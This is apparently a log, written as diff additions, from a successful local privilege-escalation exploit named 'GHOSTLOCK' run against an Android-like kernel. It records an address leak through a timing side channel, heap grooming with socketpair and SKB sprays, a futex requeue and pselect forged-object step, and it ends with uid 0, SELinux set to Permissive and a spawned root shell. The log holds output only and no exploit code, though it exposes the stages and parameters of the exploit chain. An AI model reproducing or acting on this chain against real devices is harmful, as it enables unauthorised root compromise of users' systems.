+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[1]: 00000066bb03d578 (t=9766, ratio=1953)
+[*]   collision[2]: 00000066bb04d5f8 (t=9790, ratio=1958)
+[*]   collision[3]: 00000066bb096840 (t=9735, ratio=1947)
+[*] kernelsnitch: top times: 9790 9766 9735 9 9 8 8 8
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=9405 mm=FOUND
+[*] kernelsnitch: elapsed 3920ms mm=ffffff802385f0c0
+[*] leaked mm=ffffff802385f0c0 slab base=ffffff802385c000
+[*] v9.14 settle[settle]: 43 rounds, o2=2172 objs=1424 (quiet=20)
+[*] v9.10 gate: mm slabs 138 -> 138 objs 1424 -> 1386 (dip=0 calm=3604)
+[*] v9.12 reclaim: o2 56 -> 3744 across full sequence (gate window 138 -> 3744, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffd7a1a02060 value=ffffff802385d500 mode=5 page=ffffff802385c000 fake_lock=ffffff802385ce00 fake_w0=ffffff802385d000 fake_task=ffffff802385d200 in=0000000000000000 out1=ffffffd7a1a02058 out2=ffffff801ccb7500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff802385d200 ex3=ffffff802385ce00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=14861
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=14861
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=14861
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=14861
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=14861
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000066b8fbb168 (t=9418, ratio=1883)
+[*]   collision[2]: 00000066ba040590 (t=9476, ratio=1895)
+[*]   collision[3]: 00000066baa254b8 (t=9402, ratio=1880)
+[*] kernelsnitch: top times: 9476 9418 9402 19 19 19 19 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=14092 mm=FOUND
+[*] kernelsnitch: elapsed 2897ms mm=ffffff801d606940
+[*] leaked mm=ffffff801d606940 slab base=ffffff801d604000
+[*] v9.14 settle[settle]: 30 rounds, o2=2241 objs=1487 (quiet=20)
+[*] v9.10 gate: mm slabs 136 -> 136 objs 1487 -> 1424 (dip=0 calm=3604)
+[*] v9.12 reclaim: o2 0 -> 3840 across full sequence (gate window 136 -> 3840, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffd7a1a02060 value=ffffff801d605500 mode=5 page=ffffff801d604000 fake_lock=ffffff801d604e00 fake_w0=ffffff801d605000 fake_task=ffffff801d605200 in=0000000000000000 out1=ffffffd7a1a02058 out2=ffffff801ccb74f8 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801d605200 ex3=ffffff801d604e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=20708
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=20708
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=20708
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=20708
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=20708
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] child uid = 0 (0x00000000)
+[+] child is root!
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[+] GHOSTLOCK ROOT: uid=0 gid=483095800
+uid=0(root) gid=483095800(u4830_i5800) groups=483095800(u4830_i5800) context=u:r:kernel:s0
+Permissive
+[+] dropping to root shell
+[*] [T+551184ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
